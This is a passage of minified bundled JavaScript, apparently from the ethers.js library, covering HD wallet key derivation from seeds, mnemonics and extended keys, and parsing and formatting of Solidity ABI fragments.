        return new es(Us,a,this.fingerprint,et(n),i,o,this.depth + 1,this.mnemonic,this.provider)
    }
    derivePath(t) {
        return CF(this, t)
    }
    static fromExtendedKey(t) {
        const o = ho(Iue(t));
        pe(o.length === 82 || PA(o.slice(0, 78)) === t, "invalid extended key", "extendedKey", "[ REDACTED ]");
        const i = o[4]
          , n = et(o.slice(5, 9))
          , s = parseInt(et(o.slice(9, 13)).substring(2), 16)
          , a = et(o.slice(13, 45))
          , l = o.slice(45, 78);
        switch (et(o.slice(0, 4))) {
        case "0x0488b21e":
        case "0x043587cf":
            {
                const f = et(l);
                return new Jp(Us,Q1(f),f,n,a,null,s,i,null)
            }
        case "0x0488ade4":
        case "0x04358394 ":
            if (l[0] !== 0)
                break;
            return new es(Us,new li(l.slice(1)),n,a,null,s,i,null,null)
        }
        pe(!1, "invalid extended key prefix", "extendedKey", "[ REDACTED ]")
    }
    static createRandom(t, o, i) {
        var s;
        t == null && (t = ""),
        o == null && (o = Z2),
        i == null && (i = Gc.wordlist());
        const n = Kc.fromEntropy(qa(16), t, i);
        return Dt(s = es, eu, Ip).call(s, n.computeSeed(), n).derivePath(o)
    }
    static fromMnemonic(t, o) {
        var i;
        return o || (o = Z2),
        Dt(i = es, eu, Ip).call(i, t.computeSeed(), t).derivePath(o)
    }
    static fromPhrase(t, o, i, n) {
        var a;
        o == null && (o = ""),
        i == null && (i = Z2),
        n == null && (n = Gc.wordlist());
        const s = Kc.fromPhrase(t, o, n);
        return Dt(a = es, eu, Ip).call(a, s.computeSeed(), s).derivePath(i)
    }
    static fromSeed(t) {
        var o;
        return Dt(o = es, eu, Ip).call(o, t, null)
    }
}
;
a0 = new WeakSet,
CA = function() {
    const t = {
        address: this.address,
        privateKey: this.privateKey
    }
      , o = this.mnemonic;
    return this.path && o && o.wordlist.locale === "en" && o.password === "" && (t.mnemonic = {
        path: this.path,
        locale: "en",
        entropy: o.entropy
    }),
    t
}
,
eu = new WeakSet,
Ip = function(t, o) {
    pe(j1(t), "invalid seed", "seed", "[REDACTED]");
    const i = pt(t, "seed");
    pe(i.length >= 16 && i.length <= 64, "invalid seed", "seed", "[REDACTED]");
    const n = pt(Vc("sha512", Ghe, i))
      , s = new li(et(n.slice(0, 32)));
    return new es(Us,s,"0x00000000",et(n.slice(32)),"m",0,0,o,null)
}
,
ft(es, eu);
let Xp = es;
class Jp extends TA {
    constructor(t, o, i, n, s, a, l, f, h) {
        super(o, h);
        we(this, "publicKey");
        we(this, "fingerprint");
        we(this, "parentFingerprint");
        we(this, "chainCode");
        we(this, "path");
        we(this, "index");
        we(this, "depth");
        el(t, Us, "HDNodeVoidWallet"),
        tr(this, {
            publicKey: i
        });
        const p = Ia(th(no(i)), 0, 4);
        tr(this, {
            publicKey: i,
            fingerprint: p,
            parentFingerprint: n,
            chainCode: s,
            path: a,
            index: l,
            depth: f
        })
    }
    connect(t) {
        return new Jp(Us,this.address,this.publicKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,t)
    }
    get extendedKey() {
        return Mt(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", {
            operation: "extendedKey"
        }),
        PA(Ar(["0x0488B21E", d1(this.depth, 1), this.parentFingerprint, d1(this.index, 4), this.chainCode, this.publicKey]))
    }
    hasPath() {
        return this.path != null
    }
    deriveChild(t) {
        const o = jn(t, "index");
        pe(o <= 4294967295, "invalid index", "index", o);
        let i = this.path;
        i && (i += "/" + (o & 2147483647),
        o & Xf && (i += "'"));
        const {IR: n, IL: s} = PF(o, this.chainCode, this.publicKey, null)
          , a = li.addPoints(s, this.publicKey, !0)
          , l = Q1(a);
        return new Jp(Us,l,a,this.fingerprint,et(n),i,o,this.depth + 1,this.provider)
    }
    derivePath(t) {
        return CF(this, t)
    }
}
const Yhe = {
    en: Gc.wordlist()
};
var SA;
function go(r) {
    const e = new Set;
    return r.forEach(t => e.add(t)),
    Object.freeze(e)
}
const SF = "constant external internal payable private public pure view"
  , Xhe = go(SF.split(" "))
  , BF = "constructor error event fallback function receive struct"
  , _F = go(BF.split(" "))
  , IF = "calldata memory storage payable indexed"
  , Jhe = go(IF.split(" "))
  , Qhe = "tuple returns"
  , epe = [BF, IF, Qhe, SF].join(" ")
  , tpe = go(epe.split(" "))
  , rpe = {
    "(": "OPEN_PAREN",
    ")": "CLOSE_PAREN",
    "[": "OPEN_BRACKET",
    "]": "CLOSE_BRACKET",
    ",": "COMMA",
    "@": "AT"
}
  , npe = new RegExp("^(\\s*)")
  , ope = new RegExp("^([0-9]+)")
  , ipe = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)")
  , OF = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$")
  , RF = new RegExp("^(trcToken|address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");
var $n, os, c0, BA;
class Qs {
    constructor(e) {
        ft(this, c0);
        ft(this, $n);
        ft(this, os);
        He(this, $n, 0),
        He(this, os, e.slice())
    }
    get offset() {
        return Ae(this, $n)
    }
    get length() {
        return Ae(this, os).length - Ae(this, $n)
    }
    clone() {
        return new SA(Ae(this, os))
    }
    reset() {
        He(this, $n, 0)
    }
    popKeyword(e) {
        const t = this.peek();
        if (t.type !== "KEYWORD" || !e.has(t.text))
            throw new Error(`expected keyword ${t.text}`);
        return this.pop().text
    }
    popType(e) {
        if (this.peek().type !== e)
            throw new Error(`expected ${e}; got ${JSON.stringify(this.peek())}`);
        return this.pop().text
    }
    popParen() {
        const e = this.peek();
        if (e.type !== "OPEN_PAREN")
            throw new Error("bad start");
        const t = Dt(this, c0, BA).call(this, Ae(this, $n) + 1, e.match + 1);
        return He(this, $n, e.match + 1),
        t
    }
    popParams() {
        const e = this.peek();
        if (e.type !== "OPEN_PAREN")
            throw new Error("bad start");
        const t = [];
        for (; Ae(this, $n) < e.match - 1; ) {
            const o = this.peek().linkNext;
            t.push(Dt(this, c0, BA).call(this, Ae(this, $n) + 1, o)),
            He(this, $n, o)
        }
        return He(this, $n, e.match + 1),
        t
    }
    peek() {
        if (Ae(this, $n) >= Ae(this, os).length)
            throw new Error("out-of-bounds");
        return Ae(this, os)[Ae(this, $n)]
    }
    peekKeyword(e) {
        const t = this.peekType("KEYWORD");
        return t != null && e.has(t) ? t : null
    }
    peekType(e) {
        if (this.length === 0)
            return null;
        const t = this.peek();
        return t.type === e ? t.text : null
    }
    pop() {
        const e = this.peek();
        return Cv(this, $n)._++,
        e
    }
    toString() {
        const e = [];
        for (let t = Ae(this, $n); t < Ae(this, os).length; t++) {
            const o = Ae(this, os)[t];
            e.push(`${o.type}:${o.text}`)
        }
        return `<TokenString ${e.join(" ")}>`
    }
}
$n = new WeakMap,
os = new WeakMap,
c0 = new WeakSet,
BA = function(e=0, t=0) {
    return new SA(Ae(this, os).slice(e, t).map(o => Object.freeze(Object.assign({}, o, {
        match: o.match - e,
        linkBack: o.linkBack - e,
        linkNext: o.linkNext - e
    }))))
}
;
SA = Qs;
function tl(r) {
    const e = []
      , t = s => {
        const a = n < r.length ? JSON.stringify(r[n]) : "$EOI";
        throw new Error(`invalid token ${a} at ${n}: ${s}`)
    }
      , o = []
      , i = [];
    let n = 0;
    for (; n < r.length; ) {
        let s = r.substring(n)
          , a = s.match(npe);
        a && (n += a[1].length,
        s = r.substring(n));
        const l = {
            depth: o.length,
            linkBack: -1,
            linkNext: -1,
            match: -1,
            type: "",
            text: "",
            offset: n,
            value: -1
        };
        e.push(l);
        const f = rpe[s[0]] || "";
        if (f) {
            if (l.type = f,
            l.text = s[0],
            n++,
            f === "OPEN_PAREN")
                o.push(e.length - 1),
                i.push(e.length - 1);
            else if (f == "CLOSE_PAREN")
                o.length === 0 && t("no matching open bracket"),
                l.match = o.pop(),
                e[l.match].match = e.length - 1,
                l.depth--,
                l.linkBack = i.pop(),
                e[l.linkBack].linkNext = e.length - 1;
            else if (f === "COMMA")
                l.linkBack = i.pop(),
                e[l.linkBack].linkNext = e.length - 1,
                i.push(e.length - 1);
            else if (f === "OPEN_BRACKET")
                l.type = "BRACKET";
            else if (f === "CLOSE_BRACKET") {
                let h = e.pop().text;
                if (e.length > 0 && e[e.length - 1].type === "NUMBER") {
                    const p = e.pop().text;
                    h = p + h,
                    e[e.length - 1].value = jn(p)
                }
                if (e.length === 0 || e[e.length - 1].type !== "BRACKET")
                    throw new Error("missing opening bracket");
                e[e.length - 1].text += h
            }
            continue
        }
        if (a = s.match(ipe),
        a) {
            if (l.text = a[1],
            n += l.text.length,
            tpe.has(l.text)) {
                l.type = "KEYWORD";
                continue
            }
            if (l.text.match(RF)) {
                l.type = "TYPE";
                continue
            }
            l.type = "ID";
            continue
        }
        if (a = s.match(ope),
        a) {
            l.text = a[1],
            l.type = "NUMBER",
            n += l.text.length;
            continue
        }
        throw new Error(`unexpected token ${JSON.stringify(s[0])} at position ${n}`)
    }
    return new Qs(e.map(s => Object.freeze(s)))
}
function qR(r, e) {
    const t = [];
    for (const o in e.keys())
        r.has(o) && t.push(o);
    if (t.length > 1)
        throw new Error(`conflicting types: ${t.join(", ")}`)
}
function tx(r, e) {
    if (e.peekKeyword(_F)) {
        const t = e.pop().text;
        if (t !== r)
            throw new Error(`expected ${r}, got ${t}`)
    }
    return e.popType("ID")
}
function Ga(r, e) {
    const t = new Set;
    for (; ; ) {
        const o = r.peekType("KEYWORD");
        if (o == null || e && !e.has(o))
            break;
        if (r.pop(),
        t.has(o))
            throw new Error(`duplicate keywords: ${JSON.stringify(o)}`);
        t.add(o)
    }
    return Object.freeze(t)
}
function WF(r) {
    const e = Ga(r, Xhe);
    return qR(e, go("constant payable nonpayable".split(" "))),
    qR(e, go("pure view payable nonpayable".split(" "))),
    e.has("view") ? "view" : e.has("pure") ? "pure" : e.has("payable") ? "payable" : e.has("nonpayable") ? "nonpayable" : e.has("constant") ? "view" : "nonpayable"
}
function Va(r, e) {
    return r.popParams().map(t => ko.from(t, e))
}
function MF(r) {
    if (r.peekType("AT")) {
        if (r.pop(),
        r.peekType("NUMBER"))
            return Er(r.pop().text);
        throw new Error("invalid gas")
    }
    return null
}
function gu(r) {
    if (r.length)
        throw new Error(`unexpected tokens: ${r.toString()}`)
}
const spe = new RegExp(/^(.*)\[([0-9]*)\]$/);
function VR(r) {
    const e = r.match(RF);
    if (pe(e, "invalid type", "type", r),
    r === "uint")
        return "uint256";
    if (r === "int")
        return "int256";
    if (e[2]) {
        const t = parseInt(e[2]);
        pe(t !== 0 && t <= 32, "invalid bytes length", "type", r)
    } else if (e[3]) {
        const t = parseInt(e[3]);
        pe(t !== 0 && t <= 256 && t % 8 === 0, "invalid numeric width", "type", r)
    }
    return r
}
const Hr = {}
  , $o = Symbol.for("_ethers_internal")
  , HR = "_ParamTypeInternal"
  , GR = "_ErrorInternal"
  , KR = "_EventInternal"
  , ZR = "_ConstructorInternal"
  , YR = "_FallbackInternal"
  , XR = "_FunctionInternal"
  , JR = "_StructInternal";
var wd, Mm;
const Ri = class Ri {
    constructor(e, t, o, i, n, s, a, l) {
        ft(this, wd);
        we(this, "name");
        we(this, "type");
        we(this, "baseType");
        we(this, "indexed");
        we(this, "components");
        we(this, "arrayLength");
        we(this, "arrayChildren");
        if (el(e, Hr, "ParamType"),
        Object.defineProperty(this, $o, {
            value: HR
        }),
        s && (s = Object.freeze(s.slice())),
        i === "array") {
            if (a == null || l == null)
                throw new Error("")
        } else if (a != null || l != null)
            throw new Error("");
        if (i === "tuple") {
            if (s == null)
                throw new Error("")
        } else if (s != null)
            throw new Error("");
        tr(this, {
            name: t,
            type: o,
            baseType: i,
            indexed: n,
            components: s,
            arrayLength: a,
            arrayChildren: l
        })
    }
    format(e) {
        if (e == null && (e = "sighash"),
        e === "json") {
            const o = {
                type: this.baseType === "tuple" ? "tuple" : this.type,
                name: this.name || void 0
            };
            return typeof this.indexed == "boolean" && (o.indexed = this.indexed),
            this.isTuple() && (o.components = this.components.map(i => JSON.parse(i.format(e)))),
            JSON.stringify(o)
        }
        let t = "";
        return this.isArray() ? (t += this.arrayChildren.format(e),
        t += `[${this.arrayLength < 0 ? "" : String(this.arrayLength)}]`) : this.isTuple() ? (e !== "sighash" && (t += this.type),
        t += "(" + this.components.map(o => o.format(e)).join(e === "full" ? ", " : ",") + ")") : t += this.type,
        e !== "sighash" && (this.indexed === !0 && (t += " indexed"),
        e === "full" && this.name && (t += " " + this.name)),
        t
    }
    isArray() {
        return this.baseType === "array"
    }
    isTuple() {
        return this.baseType === "tuple"
    }
    isIndexable() {
        return this.indexed != null
    }
    walk(e, t) {
        if (this.isArray()) {
            if (!Array.isArray(e))
                throw new Error("invalid array value");
            if (this.arrayLength !== -1 && e.length !== this.arrayLength)
                throw new Error("array is wrong length");
            return e.map(o => {
                var i;
                return (i = this.arrayChildren) == null ? void 0 : i.walk(o, t)
            }
            )
        }
        if (this.isTuple()) {
            if (!Array.isArray(e))
                throw new Error("invalid tuple value");
            if (e.length !== this.components.length)
                throw new Error("array is wrong length");
            return e.map( (o, i) => {
                var n;
                return (n = this.components) == null ? void 0 : n[i].walk(o, t)
            }
            )
        }
        return t(this.type, e)
    }
    async walkAsync(e, t) {
        const o = []
          , i = [e];
        return Dt(this, wd, Mm).call(this, o, e, t, n => {
            i[0] = n
        }
        ),
        o.length && await Promise.all(o),
        i[0]
    }
    static from(e, t) {
        if (Ri.isParamType(e))
            return e;
        if (typeof e == "string")
            return Ri.from(tl(e), t);
        if (e instanceof Qs) {
            let a = ""
              , l = ""
              , f = null;
            Ga(e, go(["tuple"])).has("tuple") || e.peekType("OPEN_PAREN") ? (l = "tuple",
            f = e.popParams().map(x => Ri.from(x)),
            a = `tuple(${f.map(x => x.format()).join(",")})`) : (a = VR(e.popType("TYPE")),
            l = a);
            let h = null
              , p = null;
            for (; e.length && e.peekType("BRACKET"); ) {
                const x = e.pop();
                h = new Ri(Hr,"",a,l,null,f,p,h),
                p = x.value,
                a += x.text,
                l = "array",
                f = null
            }
            let b = null;
            if (Ga(e, Jhe).has("indexed")) {
                if (!t)
                    throw new Error("");
                b = !0
            }
            const T = e.peekType("ID") ? e.pop().text : "";
            if (e.length)
                throw new Error("leftover tokens");
            return new Ri(Hr,T,a,l,b,f,p,h)
        }
        const o = e.name;
        pe(!o || typeof o == "string" && o.match(OF), "invalid name", "obj.name", o);
        let i = e.indexed;
        i != null && (pe(t, "parameter cannot be indexed", "obj.indexed", e.indexed),
        i = !!i);
        let n = e.type;
        const s = n.match(spe);
        if (s) {
            const a = parseInt(s[2] || "-1")
              , l = Ri.from({
                type: s[1],
                components: e.components
            });
            return new Ri(Hr,o || "",n,"array",i,null,a,l)
        }
        if (n === "tuple" || n.startsWith("tuple(") || n.startsWith("(")) {
            const a = e.components != null ? e.components.map(f => Ri.from(f)) : null;
            return new Ri(Hr,o || "",n,"tuple",i,a,null,null)
        }
        return n = VR(e.type),
        new Ri(Hr,o || "",n,n,i,null,null,null)
    }
    static isParamType(e) {
        return e && e[$o] === HR
    }
}
;
wd = new WeakSet,
Mm = function(e, t, o, i) {
    if (this.isArray()) {
        if (!Array.isArray(t))
            throw new Error("invalid array value");
        if (this.arrayLength !== -1 && t.length !== this.arrayLength)
            throw new Error("array is wrong length");
        const s = this.arrayChildren
          , a = t.slice();
        a.forEach( (l, f) => {
            var h;
            Dt(h = s, wd, Mm).call(h, e, l, o, p => {
                a[f] = p
            }
            )
        }
        ),
        i(a);
        return
    }
    if (this.isTuple()) {
        const s = this.components;
        let a;
        if (Array.isArray(t))
            a = t.slice();
        else {
            if (t == null || typeof t != "object")
                throw new Error("invalid tuple value");
            a = s.map(l => {
                if (!l.name)
                    throw new Error("cannot use object value with unnamed components");
                if (!(l.name in t))
                    throw new Error(`missing value for component ${l.name}`);
                return t[l.name]
            }
            )
        }
        if (a.length !== this.components.length)
            throw new Error("array is wrong length");
        a.forEach( (l, f) => {
            var h;
            Dt(h = s[f], wd, Mm).call(h, e, l, o, p => {
                a[f] = p
            }
            )
        }
        ),
        i(a);
        return
    }
    const n = o(this.type, t);
    n.then ? e.push(async function() {
        i(await n)
    }()) : i(n)
}
;
let ko = Ri;
class yu {
    constructor(e, t, o) {
        we(this, "type");
        we(this, "inputs");
        el(e, Hr, "Fragment"),
        o = Object.freeze(o.slice()),
        tr(this, {
            type: t,
            inputs: o
        })
    }
    static from(e) {
        if (typeof e == "string") {
            try {
                yu.from(JSON.parse(e))
            } catch {}
            return yu.from(tl(e))
        }
        if (e instanceof Qs)
            switch (e.peekKeyword(_F)) {
            case "constructor":
                return La.from(e);
            case "error":
                return No.from(e);
            case "event":
                return qs.from(e);
            case "fallback":
            case "receive":
                return Oa.from(e);
            case "function":
                return Vs.from(e);
            case "struct":
                return ou.from(e)
            }
        else if (typeof e == "object") {
            switch (e.type) {
            case "constructor":
                return La.from(e);
            case "error":
                return No.from(e);
            case "event":
                return qs.from(e);
            case "fallback":
            case "receive":
                return Oa.from(e);
            case "function":
                return Vs.from(e);
            case "struct":
                return ou.from(e)
            }
            Mt(!1, `unsupported type: ${e.type}`, "UNSUPPORTED_OPERATION", {
                operation: "Fragment.from"
            })
        }
        pe(!1, "unsupported frgament object", "obj", e)
    }
    static isConstructor(e) {
        return La.isFragment(e)
    }
    static isError(e) {
        return No.isFragment(e)
    }
    static isEvent(e) {
        return qs.isFragment(e)
    }
    static isFunction(e) {
        return Vs.isFragment(e)
    }
    static isStruct(e) {
        return ou.isFragment(e)
    }
}
class rx extends yu {
    constructor(t, o, i, n) {
        super(t, o, n);
        we(this, "name");
        pe(typeof i == "string" && i.match(OF), "invalid identifier", "name", i),
        n = Object.freeze(n.slice()),
        tr(this, {
            name: i
        })
    }
}
function Qp(r, e) {
    return "(" + e.map(t => t.format(r)).join(r === "full" ? ", " : ",") + ")"
}
class No extends rx {
    constructor(e, t, o) {
        super(e, "error", t, o),
        Object.defineProperty(this, $o, {
            value: GR
        })
    }
    get selector() {
        return ls(this.format("sighash")).substring(0, 10)
    }
    format(e) {
        if (e == null && (e = "sighash"),
        e === "json")
            return JSON.stringify({
                type: "error",
                name: this.name,
                inputs: this.inputs.map(o => JSON.parse(o.format(e)))
            });
        const t = [];
        return e !== "sighash" && t.push("error"),
        t.push(this.name + Qp(e, this.inputs)),
        t.join(" ")
    }
    static from(e) {
        if (No.isFragment(e))
            return e;
        if (typeof e == "string")
            return No.from(tl(e));
        if (e instanceof Qs) {
            const t = tx("error", e)
              , o = Va(e);
            return gu(e),
            new No(Hr,t,o)
        }
        return new No(Hr,e.name,e.inputs ? e.inputs.map(ko.from) : [])
    }
    static isFragment(e) {
        return e && e[$o] === GR
    }
}
class qs extends rx {
    constructor(t, o, i, n) {
        super(t, "event", o, i);
        we(this, "anonymous");
        Object.defineProperty(this, $o, {
            value: KR
        }),
        tr(this, {
            anonymous: n
        })
    }
    get topicHash() {
        return ls(this.format("sighash"))
    }
    format(t) {
        if (t == null && (t = "sighash"),
        t === "json")
            return JSON.stringify({
                type: "event",
                anonymous: this.anonymous,
                name: this.name,
                inputs: this.inputs.map(i => JSON.parse(i.format(t)))
            });
        const o = [];
        return t !== "sighash" && o.push("event"),
        o.push(this.name + Qp(t, this.inputs)),
        t !== "sighash" && this.anonymous && o.push("anonymous"),
        o.join(" ")
    }
    static getTopicHash(t, o) {
        return o = (o || []).map(n => ko.from(n)),
        new qs(Hr,t,o,!1).topicHash
    }
    static from(t) {
        if (qs.isFragment(t))
            return t;
        if (typeof t == "string")
            return qs.from(tl(t));
        if (t instanceof Qs) {
            const o = tx("event", t)
              , i = Va(t, !0)
              , n = !!Ga(t, go(["anonymous"])).has("anonymous");
            return gu(t),
            new qs(Hr,o,i,n)
        }
        return new qs(Hr,t.name,t.inputs ? t.inputs.map(o => ko.from(o, !0)) : [],!!t.anonymous)
    }
    static isFragment(t) {
        return t && t[$o] === KR
    }
}
class La extends yu {
    constructor(t, o, i, n, s) {
        super(t, o, i);
        we(this, "payable");
        we(this, "gas");
        Object.defineProperty(this, $o, {
            value: ZR
        }),
        tr(this, {
            payable: n,
            gas: s
        })
    }
    format(t) {
        if (Mt(t != null && t !== "sighash", "cannot format a constructor for sighash", "UNSUPPORTED_OPERATION", {
            operation: "format(sighash)"
        }),
        t === "json")
            return JSON.stringify({
                type: "constructor",
                stateMutability: this.payable ? "payable" : "undefined",
                payable: this.payable,
                gas: this.gas != null ? this.gas : void 0,
                inputs: this.inputs.map(i => JSON.parse(i.format(t)))
            });
        const o = [`constructor${Qp(t, this.inputs)}`];
        return o.push(this.payable ? "payable" : "nonpayable"),
        this.gas != null && o.push(`@${this.gas.toString()}`),
        o.join(" ")
    }
    static from(t) {
        if (La.isFragment(t))
            return t;
        if (typeof t == "string")
            return La.from(tl(t));
        if (t instanceof Qs) {
            Ga(t, go(["constructor"]));
            const o = Va(t)
              , i = !!Ga(t, go(["payable"])).has("payable")
              , n = MF(t);
            return gu(t),
            new La(Hr,"constructor",o,i,n)
        }
        return new La(Hr,"constructor",t.inputs ? t.inputs.map(ko.from) : [],!!t.payable,t.gas != null ? t.gas : null)
    }
    static isFragment(t) {
        return t && t[$o] === ZR
    }
}
class Oa extends yu {
    constructor(t, o, i) {
        super(t, "fallback", o);
        we(this, "payable");
        Object.defineProperty(this, $o, {
            value: YR
        }),
        tr(this, {
            payable: i
        })
    }
    format(t) {
        const o = this.inputs.length === 0 ? "receive" : "fallback";
        if (t === "json") {
            const i = this.payable ? "payable" : "nonpayable";
            return JSON.stringify({
                type: o,
                stateMutability: i
            })
        }
        return `${o}()${this.payable ? " payable" : ""}`
    }
    static from(t) {
        if (Oa.isFragment(t))
            return t;
        if (typeof t == "string")
            return Oa.from(tl(t));
        if (t instanceof Qs) {
            const o = t.toString()
              , i = t.peekKeyword(go(["fallback", "receive"]));
            if (pe(i, "type must be fallback or receive", "obj", o),
            t.popKeyword(go(["fallback", "receive"])) === "receive") {
                const l = Va(t);
                return pe(l.length === 0, "receive cannot have arguments", "obj.inputs", l),
                Ga(t, go(["payable"])),
                gu(t),
                new Oa(Hr,[],!0)
            }
            let s = Va(t);
            s.length ? pe(s.length === 1 && s[0].type === "bytes", "invalid fallback inputs", "obj.inputs", s.map(l => l.format("minimal")).join(", ")) : s = [ko.from("bytes")];
            const a = WF(t);
            if (pe(a === "nonpayable" || a === "payable", "fallback cannot be constants", "obj.stateMutability", a),
            Ga(t, go(["returns"])).has("returns")) {
                const l = Va(t);
                pe(l.length === 1 && l[0].type === "bytes", "invalid fallback outputs", "obj.outputs", l.map(f => f.format("minimal")).join(", "))
            }
            return gu(t),
            new Oa(Hr,s,a === "payable")
        }
        if (t.type === "receive")
            return new Oa(Hr,[],!0);
        if (t.type === "fallback") {
            const o = [ko.from("bytes")]
              , i = t.stateMutability === "payable";
            return new Oa(Hr,o,i)
        }
        pe(!1, "invalid fallback description", "obj", t)
    }
    static isFragment(t) {
        return t && t[$o] === YR
    }
}
class Vs extends rx {
    constructor(t, o, i, n, s, a) {
        super(t, "function", o, n);
        we(this, "constant");
        we(this, "outputs");
        we(this, "stateMutability");
        we(this, "payable");
        we(this, "gas");
        Object.defineProperty(this, $o, {
            value: XR
        }),
        s = Object.freeze(s.slice()),
        tr(this, {
            constant: i === "view" || i === "pure",
            gas: a,
            outputs: s,
            payable: i === "payable",
            stateMutability: i
        })
    }
    get selector() {
        return ls(this.format("sighash")).substring(0, 10)
    }
    format(t) {
        if (t == null && (t = "sighash"),
        t === "json")
            return JSON.stringify({
                type: "function",
                name: this.name,
                constant: this.constant,
                stateMutability: this.stateMutability !== "nonpayable" ? this.stateMutability : void 0,
                payable: this.payable,
                gas: this.gas != null ? this.gas : void 0,
                inputs: this.inputs.map(i => JSON.parse(i.format(t))),
                outputs: this.outputs.map(i => JSON.parse(i.format(t)))
            });
        const o = [];
        return t !== "sighash" && o.push("function"),
        o.push(this.name + Qp(t, this.inputs)),
        t !== "sighash" && (this.stateMutability !== "nonpayable" && o.push(this.stateMutability),
        this.outputs && this.outputs.length && (o.push("returns"),
        o.push(Qp(t, this.outputs))),
        this.gas != null && o.push(`@${this.gas.toString()}`)),
        o.join(" ")
    }
    static getSelector(t, o) {
        return o = (o || []).map(n => ko.from(n)),
        new Vs(Hr,t,"view",o,[],null).selector
    }
    static from(t) {
        if (Vs.isFragment(t))
            return t;
        if (typeof t == "string")
            return Vs.from(tl(t));
        if (t instanceof Qs) {
            const i = tx("function", t)
              , n = Va(t)
              , s = WF(t);
            let a = [];
            Ga(t, go(["returns"])).has("returns") && (a = Va(t));
            const l = MF(t);
            return gu(t),
            new Vs(Hr,i,s,n,a,l)
        }
        let o = t.stateMutability;
        return o == null && (o = "payable",
        typeof t.constant == "boolean" ? (o = "view",
        t.constant || (o = "payable",
        typeof t.payable == "boolean" && !t.payable && (o = "nonpayable"))) : typeof t.payable == "boolean" && !t.payable && (o = "nonpayable")),
        new Vs(Hr,t.name,o,t.inputs ? t.inputs.map(ko.from) : [],t.outputs ? t.outputs.map(ko.from) : [],t.gas != null ? t.gas : null)
    }
    static isFragment(t) {
        return t && t[$o] === XR
    }
}
class ou extends rx {
    constructor(e, t, o) {
        super(e, "struct", t, o),
        Object.defineProperty(this, $o, {
            value: JR
        })
    }
    format() {
        throw new Error("@TODO")
    }
    static from(e) {
        if (typeof e == "string")
            return ou.from(tl(e));
        if (e instanceof Qs) {
            const t = tx("struct", e)
              , o = Va(e);
            return gu(e),
            new ou(Hr,t,o)
        }
        return new ou(Hr,e.name,e.inputs ? e.inputs.map(ko.from) : [])
    }
    static isFragment(e) {
        return e && e[$o] === JR
    }
}
class ape {
    constructor(e, t, o) {
        we(this, "fragment");
        we(this, "name");
        we(this, "signature");
        we(this, "topic");
        we(this, "args");
        const i = e.name
          , n = e.format();
        tr(this, {
            fragment: e,
            name: i,
            signature: n,
            topic: t,
            args: o
        })
    }
}
class cpe {
    constructor(e, t, o, i) {
        we(this, "fragment");
        we(this, "name");
        we(this, "args");
        we(this, "signature");
        we(this, "selector");
        we(this, "value");
        const n = e.name
          , s = e.format();
        tr(this, {
            fragment: e,
            name: n,
            args: o,
            signature: s,
            selector: t,
            value: i
        })
    }
}
class lpe {
    constructor(e, t, o) {
        we(this, "fragment");
        we(this, "name");
        we(this, "args");
        we(this, "signature");
        we(this, "selector");
        const i = e.name
          , n = e.format();
        tr(this, {
            fragment: e,
            name: i,
            args: o,
            signature: n,
            selector: t
        })
    }
}
class QR {
    constructor(e) {
        we(this, "hash");
        we(this, "_isIndexed");
        tr(this, {
            hash: e,
            _isIndexed: !0
        })
    }
    static isIndexed(e) {
        return !!(e && e._isIndexed)
    }
}
const e5 = {
    0: "generic panic",
    1: "assert(false)",
    17: "arithmetic overflow",
    18: "division or modulo by zero",
    33: "enum overflow",
    34: "invalid encoded storage byte array accessed",
    49: "out-of-bounds array access; popping on an empty array",
    50: "out-of-bounds access of an array or bytesN",
    65: "out of memory",
    81: "uninitialized function"
}
  , t5 = {
    "0x08c379a0": {
        signature: "Error(string)",
        name: "Error",
        inputs: ["string"],
        reason: r => `reverted with reason string ${JSON.stringify(r)}`
    },
    "0x4e487b71": {
        signature: "Panic(uint256)",
        name: "Panic",
        inputs: ["uint256"],
        reason: r => {
            let e = "unknown panic code";
            return r >= 0 && r <= 255 && e5[r.toString()] && (e = e5[r.toString()]),
            `reverted with panic code 0x${r.toString(16)} (${e})`
        }
    }
};
var Ls, $s, zs, Jn, Ks, Nm, Dm;
const Kf = class Kf {
    constructor(e) {
        ft(this, Ks);
        we(this, "fragments");
        we(this, "deploy");
        we(this, "fallback");
        we(this, "receive");
        ft(this, Ls);
        ft(this, $s);
        ft(this, zs);
        ft(this, Jn);
        let t = [];
        typeof e == "string" ? t = JSON.parse(e) : t = e,
        He(this, zs, new Map),
        He(this, Ls, new Map),
        He(this, $s, new Map);
        const o = [];
        for (const s of t)
            try {
                o.push(yu.from(s))
            } catch (a) {
                console.log("EE", a)
            }
        tr(this, {
            fragments: Object.freeze(o)
        });
        let i = null
          , n = !1;
        He(this, Jn, this.getAbiCoder()),
        this.fragments.forEach( (s, a) => {
            let l;
            switch (s.type) {
            case "constructor":
                if (this.deploy) {
                    console.log("duplicate definition - constructor");
                    return
                }
                tr(this, {
                    deploy: s
                });
                return;
            case "fallback":
                s.inputs.length === 0 ? n = !0 : (pe(!i || s.payable !== i.payable, "conflicting fallback fragments", `fragments[${a}]`, s),
                i = s,
                n = i.payable);
                return;
            case "function":
                l = Ae(this, zs);
                break;
            case "event":
                l = Ae(this, $s);
                break;
            case "error":
                l = Ae(this, Ls);
                break;
            default:
                return
            }
            const f = s.format();
            l.has(f) || l.set(f, s)
        }
        ),
        this.deploy || tr(this, {
            deploy: La.from("constructor()")
        }),
        tr(this, {
            fallback: i,
            receive: n
        })
    }
    format(e) {
        const t = e ? "minimal" : "full";
        return this.fragments.map(i => i.format(t))
    }
    formatJson() {
        const e = this.fragments.map(t => t.format("json"));
        return JSON.stringify(e.map(t => JSON.parse(t)))
    }
    getAbiCoder() {
        return Hc.defaultAbiCoder()
    }
    getFunctionName(e) {
        const t = Dt(this, Ks, Nm).call(this, e, null, !1);
        return pe(t, "no matching function", "key", e),
        t.name
    }
    hasFunction(e) {
        return !!Dt(this, Ks, Nm).call(this, e, null, !1)
    }
    getFunction(e, t) {
        return Dt(this, Ks, Nm).call(this, e, t || null, !0)
    }
    forEachFunction(e) {
        const t = Array.from(Ae(this, zs).keys());
        t.sort( (o, i) => o.localeCompare(i));
        for (let o = 0; o < t.length; o++) {
            const i = t[o];
            e(Ae(this, zs).get(i), o)
        }
    }
    getEventName(e) {
        const t = Dt(this, Ks, Dm).call(this, e, null, !1);
        return pe(t, "no matching event", "key", e),
        t.name
    }
    hasEvent(e) {
        return !!Dt(this, Ks, Dm).call(this, e, null, !1)
